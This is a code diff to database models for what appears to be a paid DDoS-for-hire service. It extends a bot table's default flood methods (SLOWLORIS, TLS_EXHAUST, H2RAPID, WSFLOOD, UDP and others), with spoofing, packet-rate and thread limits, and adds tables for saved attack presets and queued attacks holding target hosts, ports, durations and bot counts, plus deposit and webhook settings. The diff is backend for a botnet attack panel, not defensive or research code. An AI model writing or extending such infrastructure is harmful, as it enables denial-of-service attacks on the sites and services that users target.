@@ -91,7 +91,7 @@ class Bot(Base):
     max_pps = Column(Integer, default=50000000)
     max_mbps = Column(Integer, default=1000)
     max_threads = Column(Integer, default=10000)
-    enabled_methods = Column(ARRAY(Text), default=lambda: ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","HTTP_PROXY","GAME","UDP"])
+    enabled_methods = Column(ARRAY(Text), default=lambda: ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","HTTP_PROXY","GAME","H2RAPID","WSFLOOD","GRAPHQL","UDP"])
     spoof_mode = Column(Integer, default=0)
     fragmentation = Column(Boolean, default=False)
     last_heartbeat_at = Column(DateTime(timezone=True))
@@ -170,4 +170,37 @@ class SiteSettings(Base):
     min_deposit = Column(Integer, default=10000)
     # Misc
     maintenance_mode = Column(Boolean, default=False)
+    # Webhook
+    discord_webhook_url = Column(String(255), default="")
     updated_at = Column(DateTime(timezone=True), default=utcnow, onupdate=utcnow)
+
+
+class AttackTemplate(Base):
+    """User-saved attack presets for quick reuse."""
+    __tablename__ = "attack_templates"
+    id = Column(UUID, primary_key=True, default=new_uuid)
+    user_id = Column(UUID, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
+    name = Column(String(64), nullable=False)
+    target_host = Column(String(255), nullable=False)
+    target_port = Column(Integer, nullable=False, default=80)
+    method = Column(String(16), nullable=False, default="MEGA")
+    duration_secs = Column(Integer, default=60)
+    bot_count = Column(Integer, default=1)
+    created_at = Column(DateTime(timezone=True), default=utcnow)
+
+
+class AttackQueue(Base):
+    """Queued attacks waiting for available bots."""
+    __tablename__ = "attack_queue"
+    id = Column(UUID, primary_key=True, default=new_uuid)
+    user_id = Column(UUID, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
+    target_host = Column(String(255), nullable=False)
+    target_port = Column(Integer, nullable=False)
+    method = Column(String(16), nullable=False)
+    duration_secs = Column(Integer, nullable=False)
+    pps_per_bot = Column(Integer, default=100000)
+    bot_count = Column(Integer, default=1)
+    status = Column(String(16), default="queued")  # queued → running → done/cancelled
+    task_id = Column(UUID, ForeignKey("attack_tasks.id", ondelete="SET NULL"), nullable=True)
+    created_at = Column(DateTime(timezone=True), default=utcnow)
+    started_at = Column(DateTime(timezone=True), nullable=True)
